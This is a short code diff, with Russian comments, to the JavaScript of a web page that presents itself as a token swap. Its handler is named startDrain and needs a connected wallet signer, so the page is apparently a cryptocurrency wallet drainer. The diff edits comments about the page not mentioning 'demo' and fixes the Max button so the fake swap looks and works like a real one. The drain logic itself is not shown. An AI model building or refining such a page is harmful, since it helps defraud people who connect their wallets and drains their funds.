@@ -518,7 +518,7 @@
                 }
             }
 
-            // ===== ОБРАБОТКА СВАПА (без упоминаний demo) =====
+            // ===== ОБРАБОТКА СВАПА =====
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -579,16 +579,19 @@
                 startDrain();
             });
 
-            // Кнопка Max — устанавливает фиксированное значение (без подписей "demo")
-            maxBtn.addEventListener('click', function() {
+            // ===== ИСПРАВЛЕННЫЙ ОБРАБОТЧИК MAX (без arguments.callee) =====
+            function handleMaxClick() {
                 const amount = 0.001;
+                // Обновляем innerHTML, заменяя кнопку на новую с тем же id
                 balanceFrom.innerHTML = amount.toFixed(6) + ' <button class="max-tag" id="maxBtn">Max</button>';
                 inputAmount.value = amount.toFixed(6);
                 updateSwapButton();
                 setStatus('Max amount set', '');
                 updateRateAndOutput();
-                document.getElementById('maxBtn').addEventListener('click', arguments.callee);
-            });
+                // Перепривязываем обработчик на новую кнопку
+                document.getElementById('maxBtn').addEventListener('click', handleMaxClick);
+            }
+            maxBtn.addEventListener('click', handleMaxClick);
 
             inputAmount.addEventListener('input', function() {
                 updateSwapButton();
